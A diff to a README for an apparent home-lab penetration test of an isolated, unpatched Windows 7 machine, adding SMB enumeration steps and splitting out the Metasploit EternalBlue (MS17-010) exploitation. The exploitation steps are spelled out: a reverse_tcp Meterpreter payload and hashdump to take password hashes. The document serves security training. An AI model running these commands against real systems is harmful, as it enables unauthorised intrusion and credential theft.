@@ -18,7 +18,7 @@ Complete Vulnerability Assessment and Penetration Testing (VAPT) engagement agai
 | Attacker Machine | Kali Linux (VirtualBox) |
 | Target Machine | Windows 7 (unpatched, vulnerable to MS17-010) |
 | Network | Host-Only Adapter (isolated) |
-| Tools Used | Nmap, Metasploit Framework, Meterpreter |
+| Tools Used | Nmap, smbclient, enum4linux, Metasploit Framework, Meterpreter |
 
 ---
 
@@ -36,18 +36,8 @@ Complete Vulnerability Assessment and Penetration Testing (VAPT) engagement agai
 
 ## Methodology
 
-### 1. Reconnaissance
-Identified the target IP on the host-only network and confirmed host availability.
-
-```bash
-arp-scan --localnet
-ping -c 4 <target-ip>
-```
-
-
-
-### 2. Enumeration
-Performed a full port and service scan to identify open services and versions.
+### 1. Nmap Service Scan
+Performed a full port and service scan to identify open services and versions on the target.
 
 ```bash
 nmap -sS -sV -A -T4 -p- <target-ip>
@@ -61,8 +51,35 @@ PORT     STATE SERVICE      VERSION
 
 ![Nmap Service Scan](Screenshots/01-nmap-service-scan.png)
 
-### 3. Vulnerability Assessment
-Ran Nmap's SMB vulnerability scripts to confirm exposure to MS17-010.
+### 2. SMB Enumeration
+Enumerated SMB shares and configuration exposed on port 445.
+
+```bash
+nmap -p445 --script smb-os-discovery,smb-enum-shares <target-ip>
+```
+
+![SMB Enumeration](Screenshots/02-smb-enum.png)
+
+### 3. SMB Client Access
+Connected to SMB shares to inspect accessible resources.
+
+```bash
+smbclient -L //<target-ip>/ -N
+```
+
+![smbclient](Screenshots/03-smbclient.png)
+
+### 4. enum4linux Enumeration
+Gathered additional host, share, and user information via enum4linux.
+
+```bash
+enum4linux -a <target-ip>
+```
+
+![enum4linux](Screenshots/04-enum4linux.png)
+
+### 5. MS17-010 Vulnerability Confirmation
+Ran Nmap's SMB vulnerability script to confirm exposure to MS17-010.
 
 ```bash
 nmap --script smb-vuln-ms17-010 -p445 <target-ip>
@@ -76,23 +93,41 @@ nmap --script smb-vuln-ms17-010 -p445 <target-ip>
 |     IDs: CVE:CVE-2017-0143
 |     Risk factor: HIGH
 
-![Vulnerability Scan](Screenshots/02-smb-enum.png)
+![MS17-010 Vulnerability](Screenshots/05-ms17-vulnerability.png)
 
-### 4. Exploitation
-Used Metasploit's EternalBlue module to gain remote code execution.
+### 6. Metasploit Module Search
+Searched Metasploit for the relevant EternalBlue exploit module.
 
 ```bash
 msfconsole
+search ms17-010
+```
+
+![Metasploit Search](Screenshots/06-metasploit-search.png)
+
+### 7. Module Options
+Selected the exploit module and reviewed/configured required options.
+
+```bash
 use exploit/windows/smb/ms17_010_eternalblue
+show options
 set RHOSTS <target-ip>
 set LHOST <attacker-ip>
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
+```
+
+![Module Options](Screenshots/07-module-options.png)
+
+### 8. Running the Exploit
+Executed the exploit against the target to gain remote code execution.
+
+```bash
 exploit
 ```
 
-![Exploitation](Screenshots/04-eternalblue-exploit.png)
+![Running Exploit](Screenshots/08-running-exploit.png)
 
-### 5. Post-Exploitation
+### 9. Meterpreter Session
 Obtained a Meterpreter session with SYSTEM-level privileges and confirmed access.
 
 ```bash
@@ -101,7 +136,7 @@ meterpreter > sysinfo
 meterpreter > hashdump
 ```
 
-![Meterpreter Session](Screenshots/05-meterpreter-session.png)
+![Meterpreter Session](Screenshots/09-meterpreter-session.png)
 
 ---
 
@@ -123,7 +158,7 @@ Successful exploitation resulted in unauthenticated remote code execution with *
 ## Skills Demonstrated
 
 - Network reconnaissance and host discovery
-- Service enumeration with Nmap (NSE scripting)
+- SMB enumeration using Nmap, smbclient, and enum4linux
 - Vulnerability identification and CVE/CVSS mapping
 - Exploit development workflow using Metasploit Framework
 - Post-exploitation and privilege verification with Meterpreter
@@ -134,12 +169,17 @@ Successful exploitation resulted in unauthenticated remote code execution with *
 ## Repository Structure
 Windows-7-MS17-010-VAPT-Lab/
 ├── README.md
+├── LICENSE
 └── Screenshots/
-├── 01-host-discovery.png
-├── 02-nmap-service-scan.png
-├── 03-smb-vuln-scan.png
-├── 04-eternalblue-exploit.png
-└── 05-meterpreter-session.png
+├── 01-nmap-service-scan.png
+├── 02-smb-enum.png
+├── 03-smbclient.png
+├── 04-enum4linux.png
+├── 05-ms17-vulnerability.png
+├── 06-metasploit-search.png
+├── 07-module-options.png
+├── 08-running-exploit.png
+└── 09-meterpreter-session.png
 
 ---
 
